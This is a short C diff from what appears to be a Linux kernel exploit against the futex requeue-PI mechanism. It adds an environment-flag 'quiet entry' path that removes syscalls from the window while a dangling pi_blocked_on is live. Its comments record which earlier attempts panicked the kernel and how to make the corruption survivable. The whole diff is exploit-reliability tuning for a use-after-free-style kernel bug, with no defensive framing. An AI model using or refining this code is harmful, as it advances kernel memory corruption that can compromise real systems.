@@ -230,16 +230,37 @@ void *waiter_thread(void *arg __attribute__((unused))) {
      * releases it) and the dangling dies with the waiter task. */
     return NULL;
   }
-  pr_info("WAIT_REQUEUE_PI ret=%ld errno=%d (%s)\n", wret, werr,
-          werr == EDEADLK ? "EDEADLK" :
-          werr == ETIMEDOUT ? "ETIMEDOUT" :
-          werr == EAGAIN ? "EAGAIN" :
-          werr == EWOULDBLOCK ? "EWOULDBLOCK" : "other");
+  /*
+   * MODE4_JC2_QUIET_ENTRY (roll 19, from the roll 16/17/18 matrix):
+   * roll 16 (single-shot) died in THIS window — the pr_info write, the
+   * usleep(200) timer syscalls, and the durable_stage file I/O below
+   * all reuse the ghost's kernel-stack region while the dangling
+   * pi_blocked_on is live; a concurrent PI walk through the garbage
+   * panics. Roll 17/18 (selfstamp) proved the no-syscall window is
+   * survivable but its quiescent handoff makes the punch lethal (roll
+   * 18: the walk needs the waiter blocked IN select, per roll 14's
+   * full cycle). Quiet entry = roll-14 flow + roll-17 window hygiene:
+   * skip all intermediate syscalls, spin on requeue_done with
+   * sched_yield only, straight into do_pselect_fake_lock_route.
+   */
+  int quiet_entry = env_flag("MODE4_JC2_QUIET_ENTRY", 0);
+  if (!quiet_entry) {
+    pr_info("WAIT_REQUEUE_PI ret=%ld errno=%d (%s)\n", wret, werr,
+            werr == EDEADLK ? "EDEADLK" :
+            werr == ETIMEDOUT ? "ETIMEDOUT" :
+            werr == EAGAIN ? "EAGAIN" :
+            werr == EWOULDBLOCK ? "EWOULDBLOCK" : "other");
+  }
   /* A53: spin_until(deadlock_seen) after WAIT returns — requeue finished. */
-  while (!atomic_load(&requeue_done))
-    usleep(200);
-  usleep(5000);
-  durable_stage("waiter_after_requeue_enter_pselect");
+  if (quiet_entry) {
+    while (!atomic_load(&requeue_done))
+      sched_yield();
+  } else {
+    while (!atomic_load(&requeue_done))
+      usleep(200);
+    usleep(5000);
+    durable_stage("waiter_after_requeue_enter_pselect");
+  }
   do_pselect_fake_lock_route();
   durable_stage("waiter_pselect_returned");
   atomic_store(&route_done, 1);
